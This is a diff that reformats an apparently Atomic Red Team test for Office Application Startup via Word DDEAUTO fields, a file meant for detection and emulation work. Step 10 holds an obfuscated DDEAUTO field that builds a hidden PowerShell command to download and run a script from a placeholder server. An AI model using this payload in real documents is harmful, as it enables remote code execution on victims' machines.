@@ -1,11 +1,9 @@
----
-attack_technique: T1137
+attack_technique:
+- T1137
 display_name: Office Application Startup
-
 atomic_tests:
 - name: DDEAUTO
-  auto_generated_guid: cf91174c-4e74-414e-bec0-8d60a104d181
-  description: |
+  description: |2
 
     TrustedSec - Unicorn - https://github.com/trustedsec/unicorn
 
@@ -14,12 +12,9 @@ atomic_tests:
     Word VBA Macro
 
     [Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)
-
   supported_platforms:
-    - windows
-
+  - windows
   executor:
-    name: manual
     steps: |
       1. Open Word
 
@@ -38,3 +33,5 @@ atomic_tests:
       9. DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
 
       10. DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # " "Microsoft Document Security Add-On"
+    name: manual
+
